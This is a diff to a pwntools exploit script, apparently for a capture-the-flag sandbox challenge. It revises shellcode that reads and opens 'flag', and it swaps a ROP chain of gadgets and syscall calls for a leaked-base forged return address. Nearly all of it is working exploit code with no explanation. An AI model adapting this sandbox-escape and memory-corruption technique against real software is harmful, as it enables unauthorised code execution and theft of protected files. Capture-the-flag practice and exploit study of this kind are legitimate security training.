@@ -40,18 +40,15 @@ payload = asm(
 
     mov esi, 0
     mov edx, esp
-    mov ecx, 0x100
-    call read /* read rop */
+    mov ecx, 0x10
+    call read /* read return address */
 
-    mov esi, esp
-    call open
-
-    std /* Hoo ray! */
+    std /* Yoooooo! */
     mov esi, esp
     add esi, 8
     call open
 
-    mov esi, 4
+    mov esi, eax /* open("flag")'s fd */
     mov edx, esp
     mov ecx, 0x100
     call read
@@ -93,24 +90,13 @@ context.clear(arch = 'amd64')
 r.recvuntil('code!\n')
 r.send(payload + 'deadbeef')
 r.recvuntil("[*] let's go...\n")
-elf = ELF('sandbox')
-elf.address = u64(unhex(r.recvn(12))[::-1] + '\0\0')
-log.info('text base: ' + hex(elf.address))
-
-ret = elf.address + 0xbf6
-flag = elf.address + 0x1914
-xor_eax = elf.address + 0x1430
-pop_rdi = elf.address + 0x17dd
-pop_rsi_15 = elf.address + 0x17db
-pop_rbx = elf.address + 0x1402
+text_base = u64(unhex(r.recvn(12))[::-1] + '\0\0')
+log.info('text base: ' + hex(text_base))
 #  raw_input()
+log.info("Sending forged address..")
 r.send(flat(
-    ret, ret, ret, # whatever
-    pop_rdi, 2, # open
-    pop_rsi_15, flag, 0,
-    elf.plt['syscall'],
-    pop_rbx, 0x00000000beeffdec, # resume stack
-    0x10000002c,
+    text_base + 0x13d7,
+    "flag".ljust(8, '\x00'),
 ))
 
 r.interactive()
